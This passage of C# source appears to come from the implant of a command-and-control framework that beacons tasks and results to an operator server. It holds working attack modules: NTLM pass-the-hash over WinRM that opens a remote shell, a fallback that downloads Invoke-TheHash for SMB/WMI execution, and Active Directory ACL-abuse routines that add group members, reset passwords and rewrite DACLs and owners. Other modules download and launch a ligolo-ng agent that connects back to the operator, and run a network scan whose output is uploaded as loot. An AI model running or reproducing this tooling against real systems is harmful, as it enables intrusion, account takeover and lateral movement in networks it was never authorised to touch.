                int ci = ln.IndexOf(':'); if (ci < 0) continue;
                string k = ln[..ci].Trim().ToLowerInvariant();
                string v = ln[(ci + 1)..].Trim();
                if      (k == "www-authenticate" && v.StartsWith("NTLM ", StringComparison.OrdinalIgnoreCase))
                    ntlm = v[5..].Trim();
                else if (k == "content-length" && int.TryParse(v, out int cl)) clen = cl;
                else if (k == "transfer-encoding" && v.Equals("chunked", StringComparison.OrdinalIgnoreCase)) chunked = true;
            }

            string body = "";
            if (clen > 0)
            {
                byte[] buf = new byte[clen]; int rd = 0;
                while (rd < clen) { int n = await ns.ReadAsync(buf.AsMemory(rd, clen - rd)); if (n <= 0) break; rd += n; }
                body = Encoding.UTF8.GetString(buf, 0, rd);
            }
            else if (chunked)
            {
                var acc = new List<byte>();
                while (true)
                {
                    var szB = new List<byte>(); int prev = 0;
                    while (true)
                    {
                        int ch = ns.ReadByte(); if (ch < 0) break;
                        szB.Add((byte)ch);
                        if (prev == '\r' && ch == '\n') break;
                        prev = ch;
                    }
                    if (!int.TryParse(Encoding.ASCII.GetString(szB.ToArray()).Trim(),
                                      System.Globalization.NumberStyles.HexNumber, null, out int csz) || csz == 0) break;
                    byte[] chunk = new byte[csz]; int rd = 0;
                    while (rd < csz) { int n = await ns.ReadAsync(chunk.AsMemory(rd, csz - rd)); if (n <= 0) break; rd += n; }
                    acc.AddRange(chunk[..rd]);
                    ns.ReadByte(); ns.ReadByte(); // trailing \r\n
                }
                body = Encoding.UTF8.GetString(acc.ToArray());
            }
            return (status, ntlm, body);
        }

        // ── WinRM PTH (native NTLM — no tool upload, full stdout/stderr capture) ──

        static async Task<string> RunWinrmPth(string username, string hashHex, string target, string? command)
        {
            byte[] ntHash = ParseNtHash(hashHex);
            var (domain, user) = SplitDomainUser(username);
            string cmd = string.IsNullOrWhiteSpace(command) ? "whoami && hostname && ipconfig" : command;

            try
            {
                using var tcp = new TcpClient { ReceiveTimeout = 20000, SendTimeout = 10000 };
                await tcp.ConnectAsync(target, 5985);
                using var ns = tcp.GetStream();

                // ── Step 1: NTLM Type1 Negotiate ──────────────────────────────
                await PthSend(ns, target, Convert.ToBase64String(NtlmNegotiate()), null);
                var (s1, tok, _) = await PthRead(ns);
                if (s1 != 401 || string.IsNullOrEmpty(tok))
                    return $"[pth] NTLM handshake failed — HTTP {s1}";

                // ── Step 2: Compute NTLMv2 from challenge ─────────────────────
                var (sc, ti) = NtlmParseChallenge(Convert.FromBase64String(tok));
                var (ntR, lmR) = NtlmComputeResponses(ntHash, user, domain, sc, ti);
                string t3 = Convert.ToBase64String(NtlmAuthenticate(user, domain, ntR, lmR));

                // ── Step 3: Authenticate + CreateShell ────────────────────────
                await PthSend(ns, target, t3, WsCreateShell(target));
                var (s2, _, createBody) = await PthRead(ns);
                if (s2 != 200) return $"[pth] Authentication failed — HTTP {s2}";

                string? shellId = XmlText(createBody, "ShellId");
                if (string.IsNullOrEmpty(shellId))
                    return "[pth] CreateShell succeeded but ShellId not found in response";

                // ── Step 4: Run command ───────────────────────────────────────
                await PthSend(ns, target, null, WsCommand(target, shellId, cmd));
                var (s3, _, cmdBody) = await PthRead(ns);
                if (s3 != 200) return $"[pth] Command dispatch failed — HTTP {s3}";

                string? cmdId = XmlText(cmdBody, "CommandId");
                if (string.IsNullOrEmpty(cmdId)) return "[pth] Could not parse CommandId";

                // ── Step 5: Collect output ────────────────────────────────────
                var stdout = new StringBuilder();
                var stderr = new StringBuilder();
                var streamRx = new Regex(
                    @"<[^:>\s]*:?Stream\s[^>]*Name=""(?<n>[^""]+)""[^>]*>(?<d>[^<]*)<",
                    RegexOptions.IgnoreCase);

                for (int i = 0; i < 30; i++)
                {
                    await PthSend(ns, target, null, WsReceive(target, shellId, cmdId));
                    var (s4, _, rcv) = await PthRead(ns);
                    if (s4 != 200) break;
                    foreach (Match m in streamRx.Matches(rcv))
                    {
                        string b64 = m.Groups["d"].Value.Trim();
                        if (string.IsNullOrEmpty(b64)) continue;
                        try
                        {
                            string decoded = Encoding.UTF8.GetString(Convert.FromBase64String(b64));
                            if (m.Groups["n"].Value == "stdout") stdout.Append(decoded);
                            else stderr.Append(decoded);
                        }
                        catch { }
                    }
                    if (rcv.Contains("CommandState/Done", StringComparison.Ordinal)) break;
                }

                // ── Step 6: Cleanup ───────────────────────────────────────────
                try
                {
                    await PthSend(ns, target, null, WsSignal(target, shellId, cmdId));
                    _ = await PthRead(ns);
                    await PthSend(ns, target, null, WsDelete(target, shellId));
                    _ = await PthRead(ns);
                }
                catch { }

                string result = stdout.ToString().TrimEnd();
                if (stderr.Length > 0) result += "\n[stderr] " + stderr.ToString().TrimEnd();
                return string.IsNullOrEmpty(result) ? "[pth] Command executed (no output)" : result;
            }
            catch (Exception e) { return $"[pth error] {e.Message}"; }
        }

        // ── PTH fallback: Invoke-TheHash for WMI / SMB (blind exec) ──────────────

        static async Task<string> RunPthTool(string username, string hashHex, string target, string service, string? command)
        {
            string? toolPath = await DownloadTool("Invoke-TheHash.ps1");
            if (toolPath == null)
                return "[pth] Invoke-TheHash.ps1 not in server/files/ — place it there for WMI/SMB PTH";

            var (domain, user) = SplitDomainUser(username);
            string nt  = hashHex.StartsWith(":") ? hashHex[1..] : hashHex.Contains(':') ? hashHex.Split(':')[^1] : hashHex;
            string cmd = string.IsNullOrWhiteSpace(command) ? "whoami && hostname" : command;
            string fn  = service == "smb" ? "Invoke-SMBExec" : "Invoke-WMIExec";

            string script =
                $". '{toolPath}'\n" +
                $"{fn} -Target {target} -Domain '{domain}' -Username '{user}' -Hash {nt} " +
                $"-Command 'cmd /c {cmd.Replace("'", "''")}' 2>&1";

            string result = RunPowerShell(script);
            return string.IsNullOrWhiteSpace(result)
                ? $"[pth/{service.ToUpper()}] Command dispatched (blind exec — Invoke-TheHash does not capture stdout)"
                : result;
        }

        // ── ACL abuse module ──────────────────────────────────────────────────────

        /// <summary>
        /// Execute an Active Directory ACL abuse operation via PowerShell ADSI.
        /// Wire format: "op|arg1|arg2[|arg3][|altuser|altpass]"
        ///   addmember           group|user
        ///   forcechangepassword user|newpassword
        ///   genericwrite        target_sam|attribute|value
        ///   writedacl           target_sam|principal_sam|right
        ///   writeowner          target_sam|new_owner_sam
        /// Append |altuser|altpass to impersonate a different account for the ADSI call.
        /// </summary>
        static string RunAclAbuse(string instruction)
        {
            var parts = instruction.Split('|');
            if (parts.Length < 2)
                return "[error] Invalid aclabuse instruction — expected: op|arg1|arg2...";

            return parts[0].ToLower() switch
            {
                "addmember"           => AclAddMember(parts),
                "forcechangepassword" => AclForceChangePassword(parts),
                "genericwrite"        => AclGenericWrite(parts),
                "writedacl"           => AclWriteDacl(parts),
                "writeowner"          => AclWriteOwner(parts),
                _                     => $"[error] Unknown ACL abuse operation: {parts[0]}"
            };
        }

        // Returns (altUser, altPass) from the tail of parts if present, otherwise (null, null).
        static (string? user, string? pass) ExtractCreds(string[] parts, int fixedCount)
        {
            if (parts.Length >= fixedCount + 2)
                return (parts[fixedCount], parts[fixedCount + 1]);
            return (null, null);
        }

        // Builds the PowerShell $root DirectoryEntry line, with or without credentials.
        // Falls back to WMI domain lookup when $env:USERDNSDOMAIN is empty (e.g. running as SYSTEM).
        static string AdsiRoot(string? altUser, string? altPass)
        {
            const string domainLine = "$_d = if ($env:USERDNSDOMAIN) { $env:USERDNSDOMAIN } else { (Get-WmiObject Win32_ComputerSystem).Domain }";
            return altUser != null
                ? $"{domainLine}\n$root = New-Object System.DirectoryServices.DirectoryEntry(\"LDAP://$_d\", '{altUser}', '{altPass}')"
                : $"{domainLine}\n$root = New-Object System.DirectoryServices.DirectoryEntry(\"LDAP://$_d\")";
        }

        /// <summary>
        /// Run a PowerShell script via -EncodedCommand (UTF-16 LE base64) to avoid
        /// any cmd.exe escaping issues. Returns combined stdout / stderr.
        /// </summary>
        static string RunPowerShell(string script)
        {
            string b64 = Convert.ToBase64String(Encoding.Unicode.GetBytes(script));
            var psi = new ProcessStartInfo
            {
                FileName               = "powershell.exe",
                Arguments              = $"-NoProfile -NonInteractive -EncodedCommand {b64}",
                RedirectStandardOutput = true,
                RedirectStandardError  = true,
                UseShellExecute        = false,
                CreateNoWindow         = true,
            };
            using var proc = Process.Start(psi)!;
            var stdoutTask = proc.StandardOutput.ReadToEndAsync();
            var stderrTask = proc.StandardError.ReadToEndAsync();
            proc.WaitForExit();
            string stdout = stdoutTask.Result;
            string stderr = stderrTask.Result;
            return string.IsNullOrWhiteSpace(stderr) ? stdout : stdout + "\n[stderr] " + stderr;
        }

        // addmember|<group>|<user>[|altuser|altpass]
        static string AclAddMember(string[] p)
        {
            if (p.Length < 3) return "[error] addmember: requires group|user";
            var (altUser, altPass) = ExtractCreds(p, 3);
            string credArgs = altUser != null ? $", '{altUser}', '{altPass}'" : "";
            string script = $@"
{AdsiRoot(altUser, altPass)}
$gs = New-Object System.DirectoryServices.DirectorySearcher($root)
$gs.Filter = '(sAMAccountName={p[1]})'
$gr = $gs.FindOne()
if (-not $gr) {{ throw 'Group {p[1]} not found' }}
$groupDN = $gr.Properties['distinguishedName'][0]
$ms = New-Object System.DirectoryServices.DirectorySearcher($root)
$ms.Filter = '(sAMAccountName={p[2]})'
$mr = $ms.FindOne()
if (-not $mr) {{ throw 'User {p[2]} not found' }}
$memberDN = $mr.Properties['distinguishedName'][0]
$groupEntry = New-Object System.DirectoryServices.DirectoryEntry(""LDAP://$groupDN""{credArgs})
$groupEntry.Add(""LDAP://$memberDN"")
$groupEntry.CommitChanges()
'[+] Added {p[2]} to {p[1]}'
";
            return RunPowerShell(script);
        }

        // forcechangepassword|<user>|<newpassword>[|altuser|altpass]
        // Uses ADSI Invoke('SetPassword') with AuthenticationTypes.Secure|Sealing so the LDAP
        // connection is signed+sealed (NTLM/Kerberos). The DC checks the AD ACL (GenericAll includes
        // User-Force-Change-Password) rather than the SAMR privilege table, which blocks non-DA callers
        // on accounts that were ever in a privileged group.
        static string AclForceChangePassword(string[] p)
        {
            if (p.Length < 3) return "[error] forcechangepassword: requires user|newpassword";
            var (altUser, altPass) = ExtractCreds(p, 3);
            string authType = "[System.DirectoryServices.AuthenticationTypes]::Secure -bor [System.DirectoryServices.AuthenticationTypes]::Sealing";
            string entryLine = altUser != null
                ? $"$u = New-Object System.DirectoryServices.DirectoryEntry(\"LDAP://$_d/$dn\", '{altUser}', '{altPass}', ({authType}))"
                : $"$u = New-Object System.DirectoryServices.DirectoryEntry(\"LDAP://$_d/$dn\", $null, $null, ({authType}))";
            string script = $@"
$ErrorActionPreference = 'Stop'
{AdsiRoot(altUser, altPass)}
$s = New-Object System.DirectoryServices.DirectorySearcher($root)
$s.Filter = '(sAMAccountName={p[1]})'
$r = $s.FindOne()
if (-not $r) {{ throw 'User {p[1]} not found' }}
$dn = $r.Properties['distinguishedName'][0]
{entryLine}
try {{
    $u.Invoke('SetPassword', '{p[2]}')
    $u.CommitChanges()
    '[+] Password changed for {p[1]}'
}} catch {{
    throw ""[error] SetPassword failed for {p[1]}: $($_.Exception.Message)""
}}
";
            return RunPowerShell(script);
        }

        // genericwrite|<target_sam>|<attribute>|<value>[|altuser|altpass]
        static string AclGenericWrite(string[] p)
        {
            if (p.Length < 4) return "[error] genericwrite: requires target|attribute|value";
            var (altUser, altPass) = ExtractCreds(p, 4);
            string credArgs = altUser != null ? $", '{altUser}', '{altPass}'" : "";
            string script = $@"
{AdsiRoot(altUser, altPass)}
$s = New-Object System.DirectoryServices.DirectorySearcher($root)
$s.Filter = '(sAMAccountName={p[1]})'
$r = $s.FindOne()
if (-not $r) {{ throw 'Object {p[1]} not found' }}
$dn = $r.Properties['distinguishedName'][0]
$obj = New-Object System.DirectoryServices.DirectoryEntry(""LDAP://$dn""{credArgs})
$obj.Put('{p[2]}', '{p[3]}')
$obj.CommitChanges()
'[+] Wrote {p[2]}={p[3]} on {p[1]}'
";
            return RunPowerShell(script);
        }

        // writedacl|<target_sam>|<principal_sam>|<right>[|altuser|altpass]
        static string AclWriteDacl(string[] p)
        {
            if (p.Length < 4) return "[error] writedacl: requires target|principal|right";
            var (altUser, altPass) = ExtractCreds(p, 4);
            string credArgs = altUser != null ? $", '{altUser}', '{altPass}'" : "";
            string script = $@"
{AdsiRoot(altUser, altPass)}
$ts = New-Object System.DirectoryServices.DirectorySearcher($root)
$ts.Filter = '(sAMAccountName={p[1]})'
$tr = $ts.FindOne()
if (-not $tr) {{ throw 'Target {p[1]} not found' }}
$tdn = $tr.Properties['distinguishedName'][0]
$ps = New-Object System.DirectoryServices.DirectorySearcher($root)
$ps.Filter = '(sAMAccountName={p[2]})'
$pr = $ps.FindOne()
if (-not $pr) {{ throw 'Principal {p[2]} not found' }}
$sid = New-Object System.Security.Principal.SecurityIdentifier($pr.Properties['objectSid'][0], 0)
$right = [System.DirectoryServices.ActiveDirectoryRights]::{p[3]}
$ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule($sid, $right, [System.Security.AccessControl.AccessControlType]::Allow)
$tgt = New-Object System.DirectoryServices.DirectoryEntry(""LDAP://$tdn""{credArgs})
$tgt.ObjectSecurity.AddAccessRule($ace)
$tgt.CommitChanges()
'[+] Granted {p[3]} to {p[2]} over {p[1]}'
";
            return RunPowerShell(script);
        }

        // writeowner|<target_sam>|<new_owner_sam>[|altuser|altpass]
        static string AclWriteOwner(string[] p)
        {
            if (p.Length < 3) return "[error] writeowner: requires target|new_owner";
            var (altUser, altPass) = ExtractCreds(p, 3);
            string credArgs = altUser != null ? $", '{altUser}', '{altPass}'" : "";
            string script = $@"
{AdsiRoot(altUser, altPass)}
$ts = New-Object System.DirectoryServices.DirectorySearcher($root)
$ts.Filter = '(sAMAccountName={p[1]})'
$tr = $ts.FindOne()
if (-not $tr) {{ throw 'Target {p[1]} not found' }}
$tdn = $tr.Properties['distinguishedName'][0]
$os = New-Object System.DirectoryServices.DirectorySearcher($root)
$os.Filter = '(sAMAccountName={p[2]})'
$or = $os.FindOne()
if (-not $or) {{ throw 'New owner {p[2]} not found' }}
$sid = New-Object System.Security.Principal.SecurityIdentifier($or.Properties['objectSid'][0], 0)
$tgt = New-Object System.DirectoryServices.DirectoryEntry(""LDAP://$tdn""{credArgs})
$tgt.ObjectSecurity.SetOwner($sid)
$tgt.CommitChanges()
'[+] Ownership of {p[1]} set to {p[2]}'
";
            return RunPowerShell(script);
        }

        // ── Pivot / ligolo-ng agent deployment ───────────────────────────────────

        /// <summary>
        /// Download agent.exe from /files/ and launch it detached so it connects
        /// back to the ligolo-ng proxy on the operator machine.
        /// Instruction format: "ip:port"  (e.g. "192.168.10.4:11601")
        /// The process runs in the background — the beacon loop continues normally.
        /// </summary>
        static async Task<string> RunPivotAgent(string connectAddr)
        {
            string? agentPath = await DownloadTool("agent.exe");
            if (agentPath == null)
                return "[error] Failed to download agent.exe — place it in server/files/";

            try
            {
                var psi = new ProcessStartInfo
                {
                    FileName        = agentPath,
                    Arguments       = $"-connect {connectAddr} -ignore-cert",
                    UseShellExecute = false,
                    CreateNoWindow  = true,
                };
                var proc = Process.Start(psi)!;
                return $"[+] ligolo-ng agent started (PID {proc.Id}), connecting to {connectAddr}";
            }
            catch (Exception e)
            {
                return $"[exec error] {e.Message}";
            }
        }

        // ── Lateral movement (disabled — re-enable when BH integration is ready) ──
        //
        // static async Task<string> RunLateralMovement(string instruction)
        // {
        //     // Planned: parse BloodHound-derived action (e.g. ChangePassword, AddMember)
        //     // and execute via native Windows commands or downloaded tooling.
        //     // instruction format TBD once Graph Logic Engine is built.
        //     return "[disabled] Lateral movement module not yet enabled";
        // }

        // ── Recon engine ──────────────────────────────────────────────────────

        static readonly int[] CommonPorts = { 21, 22, 23, 25, 80, 135, 139, 443, 445, 3389, 5985, 5986, 8080, 8443 };
        static readonly int PingTimeout   = 1000; // ms
        static readonly int PortTimeout   = 500;  // ms
        static readonly int BannerTimeout = 1000; // ms

        static async Task<string> RunRecon(string target)
        {
            var ips = ExpandTarget(target);

            // Parallel ping sweep
            var pingTasks = ips.Select(ip => PingHostAsync(ip)).ToArray();
            await Task.WhenAll(pingTasks);

            var aliveHosts = ips
                .Zip(pingTasks, (ip, t) => (ip, alive: t.Result))
                .Where(x => x.alive)
                .Select(x => x.ip)
                .ToList();

            // Scan alive hosts in parallel (fully async — no blocking threads)
            var hostTasks = aliveHosts.Select(async ip =>
            {
                string hostname = await ResolveHostnameAsync(ip);
                var portTasks   = CommonPorts.Select(p => ScanPortAsync(ip, p));
                var portResults = await Task.WhenAll(portTasks);
                var ports = portResults
                    .Where(r => r.HasValue)
                    .Select(r => new { port = r!.Value.port, service = r.Value.service, banner = r.Value.banner })
                    .ToList();
                return new { ip, hostname, ports };
            });
            var hosts = await Task.WhenAll(hostTasks);

            string json = JsonSerializer.Serialize(new { target, hosts });

            // Write to a temp file and upload to loot
            string fileName = $"recon_{DateTime.UtcNow:yyyyMMdd_HHmmss}.json";
            string tempPath = Path.Combine(Path.GetTempPath(), fileName);
            try
            {
                await File.WriteAllTextAsync(tempPath, json);
                await UploadFile(tempPath);
            }
            finally
            {
                try { File.Delete(tempPath); } catch { }
            }

            return json;
        }

        static async Task<string> ResolveHostnameAsync(string ip)
        {
            try
            {
                using var cts = new System.Threading.CancellationTokenSource(2000);
                var entry = await Dns.GetHostEntryAsync(ip, cts.Token);
                return entry.HostName;
            }
            catch { return ""; }
        }

        static async Task<(int port, string service, string banner)?> ScanPortAsync(string ip, int port)
        {
            try
            {
                using var tcp = new TcpClient();
                using var cts = new System.Threading.CancellationTokenSource(PortTimeout);
                await tcp.ConnectAsync(ip, port, cts.Token);

                string banner  = await GrabBannerAsync(tcp, ip, port);
                string service = GetServiceName(port, banner);
                return (port, service, banner);
            }
            catch { return null; }
        }

        static async Task<string> GrabBannerAsync(TcpClient tcp, string ip, int port)
        {
            // Skip banner grab for binary/SSL protocols
            if (port == 135 || port == 139 || port == 443 || port == 3389 || port == 5986 || port == 8443)
                return "";
            try
            {
                using var cts    = new System.Threading.CancellationTokenSource(BannerTimeout);
                var stream       = tcp.GetStream();

                if (port == 80 || port == 8080)
                {
                    var req = Encoding.ASCII.GetBytes($"HEAD / HTTP/1.0\r\nHost: {ip}\r\n\r\n");
                    await stream.WriteAsync(req, cts.Token);
                }

                var buf = new byte[512];
                int n = await stream.ReadAsync(buf, cts.Token);
                return new string(Encoding.ASCII.GetString(buf, 0, n)
                    .Where(c => c >= 32 || c == '\n' || c == '\r')
                    .ToArray()).Trim();
            }
            catch { return ""; }
        }

        static string GetServiceName(int port, string banner)
        {
            if (banner.StartsWith("SSH-"))
                return $"SSH ({banner.Split('\n')[0].Trim()})";
            if (banner.StartsWith("220") && port == 21)
                return $"FTP ({banner.Split('\n')[0].Trim()})";
            if (banner.StartsWith("220") && port == 25)
                return $"SMTP ({banner.Split('\n')[0].Trim()})";
            if (banner.StartsWith("HTTP/") || banner.Contains("Server:"))
            {
                var srv = banner.Split('\n').FirstOrDefault(l => l.StartsWith("Server:"));
                return srv != null ? $"HTTP ({srv[7..].Trim()})" : "HTTP";
            }
            if (banner.StartsWith("230") || banner.StartsWith("331")) return "FTP";
            if (banner.StartsWith("+OK")) return "POP3";

            return port switch
            {
                21   => "FTP",
                22   => "SSH",
                23   => "Telnet",
                25   => "SMTP",
                80   => "HTTP",
                135  => "MSRPC",
                139  => "NetBIOS",
                443  => "HTTPS",
                445  => "SMB",
                3389 => "RDP",
                5985 => "WinRM-HTTP",
                5986 => "WinRM-HTTPS",
                8080 => "HTTP-Alt",
                8443 => "HTTPS-Alt",
                _    => "unknown"
            };
        }

        static List<string> ExpandTarget(string target)
        {
            var ips = new List<string>();

            if (target.Contains('/'))
            {
                var parts  = target.Split('/');
                int prefix = int.Parse(parts[1]);
                var baseIp = IPAddress.Parse(parts[0]);
                byte[] bytes = baseIp.GetAddressBytes();

                if (prefix < 8 || prefix > 30)
                    return ips;

                uint ipInt    = (uint)(bytes[0] << 24 | bytes[1] << 16 | bytes[2] << 8 | bytes[3]);
                uint mask      = prefix == 0 ? 0 : 0xFFFFFFFF << (32 - prefix);
                uint network   = ipInt & mask;
                uint broadcast = network | ~mask;

                for (uint i = network + 1; i < broadcast; i++)
                {
                    byte[] b = new byte[4];
                    b[0] = (byte)(i >> 24);
                    b[1] = (byte)(i >> 16);
                    b[2] = (byte)(i >> 8);
                    b[3] = (byte)(i);
                    ips.Add(new IPAddress(b).ToString());
                }
            }
            else
            {
                ips.Add(target);
            }

            return ips;
        }

        static async Task<bool> PingHostAsync(string ip)
        {
            try
            {
                using var ping = new Ping();
                var reply = await ping.SendPingAsync(ip, PingTimeout);
                return reply.Status == IPStatus.Success;
            }
            catch
            {
                return false;
            }
        }

        // ── Result posting ────────────────────────────────────────────────────

        static async Task PostResult(int taskId, string output)
        {
            var payload = JsonSerializer.Serialize(new
            {
                task_id  = taskId,
                agent_id = AgentId,
                output   = output
            });

            var response = await http.PostAsync(
                $"{ServerId}/result",
                new StringContent(payload, Encoding.UTF8, "application/json")
            );

            if (!response.IsSuccessStatusCode)
                Console.WriteLine($"[-] Failed to post result: {response.StatusCode}");
        }
    }
}
